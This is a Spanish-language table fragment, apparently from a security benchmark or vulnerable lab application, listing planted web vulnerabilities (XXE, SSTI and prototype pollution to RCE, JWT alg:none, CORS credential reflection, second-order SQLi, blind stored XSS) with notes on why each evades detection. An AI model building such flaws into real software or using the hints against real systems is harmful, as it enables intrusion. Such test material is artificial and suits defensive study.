| 11 | XXE | Inyección en DTD dentro de XML; variante ciega sin reflexión |
| 12 | PP → RCE | Sink 200 OK; impacto en otro endpoint vía gadget `converter` en child_process |
| 13 | SSTI → RCE | Campo evaluado como plantilla; sintaxis específica del motor |
| 14 | JWT alg:none / confusión de clave | Confusión requiere re-firmar con la clave pública; `exp` no validado |
| 15 | Reset poisoning + token predecible | Sin reflexión (daño en el correo); token exige modelar el algoritmo |
| 16 | CORS refleja origin + creds | No es `*`; reflexión con credenciales suele pasar por "OK" |
| 17 | Session fixation | Login normal 200; requiere comparar el `sid` antes/después |
| 18 | SQLi de segundo orden | Fuente parece segura; detona en un endpoint distinto (correlación fuente→sink) |
| 19 | XSS almacenado ciego | Sin reflexión inmediata; ejecuta en la sesión del admin, en otro momento |

Los 19 vectores fueron validados end-to-end contra la aplicación en ejecución.
